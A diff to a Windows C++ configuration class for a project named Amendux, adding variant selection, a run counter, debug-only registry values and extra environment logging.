@@ -39,7 +39,7 @@ Config::~Config()
 
 void Config::InitClass()
 {
-	Log::Info(L"Config", L"Mode: " + std::to_wstring((int)currentMode));
+	Log::Info(L"Config", L"Mode: " + Config::ModeName() + L" (" + std::to_wstring((int)currentMode) + L")");
 
 	mainThreadId = ::GetCurrentThreadId();
 
@@ -53,7 +53,7 @@ void Config::InitClass()
 			break;
 		case Amendux::OperationMode::UPDATE:
 
-			CheckObsoleteConfig();
+			CheckObsoleteConfig();//TODO needs variant
 			ApplyUpdate();
 
 			LogEnvironment();
@@ -75,10 +75,14 @@ void Config::InitClass()
 void Config::LogEnvironment()
 {
 #ifdef DEBUG
-	PWCHAR sUserDir;
+	if (!bSuccess) {
+		Log::Info(L"Config", L"[Env] Current configuration failed, skip envlog");
+		return;
+	}
 
 	Log::Info(L"Config", L"[Env] PID: " + std::to_wstring(Util::currentProcessId()));
 	Log::Info(L"Config", L"[Env] Version: " + Config::getVersion());
+	Log::Info(L"Config", L"[Env] Variant: " + Config::DisplayName());
 	Log::Info(L"Config", L"[Env] GUID: " + Config::instanceGUID);
 	Log::Info(L"Config", L"[Env] Windows version: " + Util::winver());
 	Log::Info(L"Config", L"[Env] CPU cores: " + std::to_wstring(Util::cpuCores()));
@@ -87,9 +91,7 @@ void Config::LogEnvironment()
 	Log::Info(L"Config", L"[Env] Computer: " + Util::machine());
 	Log::Info(L"Config", L"[Env] Screen resolution: " + Util::windowResolution());
 	Log::Info(L"Config", L"[Env] Timezone: " + Util::timezoneName());
-
-	sUserDir = Util::getDirectory(Util::Directory::USER_STARTUP);
-	Log::Info(L"Config", L"[Env] User startup: " + std::wstring(sUserDir));
+	Log::Info(L"Config", L"[Env] Data directory: " + DataDirectory());
 #endif
 }
 
@@ -106,7 +108,9 @@ void Config::SetupDataDir()
 
 void Config::SetupPersistentConfig()
 {
-	HKEY hRoot = RegDB::createKey(HKEY_CURRENT_USER, L"SOFTWARE\\Amendux");
+	HKEY hRoot = RegDB::createKey(HKEY_CURRENT_USER, L"SOFTWARE\\Amendux"); //TODO
+	
+	/* Intance GUID */
 	LPBYTE dRsTempPath = RegDB::getValue<LPBYTE>(hRoot, REG_SZ, L"Instance", 39 * sizeof(wchar_t));
 	if (!dRsTempPath) {
 		std::wstring guid = Util::generateUUID();
@@ -118,28 +122,42 @@ void Config::SetupPersistentConfig()
 		instanceGUID = std::wstring(reinterpret_cast<PWCHAR>(dRsTempPath), 76 / sizeof(wchar_t));
 	}
 
+	/* Running procedure, must be 1 */
 	DWORD procInit = 1;
 	RegDB::setValue<DWORD *>(hRoot, REG_DWORD, L"InitProcedure", &procInit, sizeof(DWORD));
 
+	/* Startup couter */
 	DWORD *dRsRunCount = (DWORD *)RegDB::getValue<LPBYTE>(hRoot, REG_DWORD, L"RunCount", sizeof(DWORD));
 	if (!dRsRunCount) {
-		DWORD RunCount = 1;
-		RegDB::setValue<DWORD *>(hRoot, REG_DWORD, L"RunCount", &RunCount, sizeof(DWORD));
+		DWORD runCount = 1;
+		RegDB::setValue<DWORD *>(hRoot, REG_DWORD, L"RunCount", &runCount, sizeof(DWORD));
 	} else {
 		DWORD RunCount = *dRsRunCount + 1;
 		RegDB::setValue<DWORD *>(hRoot, REG_DWORD, L"RunCount", &RunCount, sizeof(DWORD));
 	}
 
-	DWORD execMode = 3;
-	RegDB::setValue<DWORD *>(hRoot, REG_DWORD, L"ExecMode", &execMode, sizeof(DWORD));
+	/* Variant mode */
+	DWORD *dRsexecMode = (DWORD *)RegDB::getValue<LPBYTE>(hRoot, REG_DWORD, L"ExecMode", sizeof(DWORD));
+	if (!dRsexecMode) {
+		DWORD execMode = Variant::pickVariant();
+		RegDB::setValue<DWORD *>(hRoot, REG_DWORD, L"ExecMode", &execMode, sizeof(DWORD));
+		variant = execMode;
+	} else {
+		variant = *dRsexecMode;
+	}
 
+	/* Always write build number */
 	DWORD build = clientVersion;
 	RegDB::setValue<DWORD *>(hRoot, REG_DWORD, L"Build", &build, sizeof(DWORD));
 
-	RegDB::setValue<LPCWSTR>(hRoot, REG_SZ, L"DisplayName", L"Amendux", 7 * sizeof(wchar_t));
-
+#if DEBUG
+	DWORD debugMode = 1;
+	RegDB::setValue<DWORD *>(hRoot, REG_DWORD, L"Debug", &debugMode, sizeof(DWORD));
+	RegDB::setValue<LPCWSTR>(hRoot, REG_SZ, L"DisplayName", DisplayName().c_str(), (DWORD)DisplayName().size() * sizeof(wchar_t));
 	RegDB::setValue<LPCWSTR>(hRoot, REG_SZ, L"Path", DataDirectory().c_str(), (DWORD)(DataDirectory().size() * sizeof(wchar_t)));
+#endif
 
+	/* Operation flags */
 	BYTE flags = 0xfe;
 	RegDB::setValue<LPBYTE>(hRoot, REG_BINARY, L"Flags", &flags, sizeof(BYTE));
 }
@@ -207,6 +225,8 @@ void Config::ApplyUpdate()
 void Config::BasicConfig()
 {
 	HKEY hRoot = RegDB::createKey(HKEY_CURRENT_USER, L"SOFTWARE\\Amendux");
+
+	/* Intance GUID */
 	LPBYTE dRsTempPath = RegDB::getValue<LPBYTE>(hRoot, REG_SZ, L"Instance", 39 * sizeof(wchar_t));
 	if (!dRsTempPath) {
 		bSuccess = false;
@@ -215,6 +235,16 @@ void Config::BasicConfig()
 
 	instanceGUID = std::wstring(reinterpret_cast<PWCHAR>(dRsTempPath), 76 / sizeof(wchar_t));
 
+	/* Variant mode */
+	DWORD *dRsexecMode = (DWORD *)RegDB::getValue<LPBYTE>(hRoot, REG_DWORD, L"ExecMode", sizeof(DWORD));
+	if (!dRsexecMode) {
+		bSuccess = false;
+		return;
+	}
+	
+	variant = *dRsexecMode;
+
+	/* Running procedure, must be 1 */
 	DWORD *procInit = (DWORD *)RegDB::getValue<LPBYTE>(hRoot, REG_DWORD, L"InitProcedure", sizeof(DWORD));
 	if (!*procInit || *procInit != 1) {
 		bSuccess = false;
